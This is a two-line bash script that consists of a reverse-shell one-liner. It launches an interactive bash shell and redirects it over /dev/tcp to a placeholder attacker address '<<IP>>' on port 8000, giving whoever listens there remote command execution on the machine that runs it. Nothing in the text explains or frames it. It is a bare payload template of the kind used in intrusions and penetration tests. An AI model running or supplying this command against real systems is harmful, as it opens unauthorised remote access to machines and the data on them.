#!/bin/bash

bash -ip >& /dev/tcp/<<IP>>/8000 0>&1
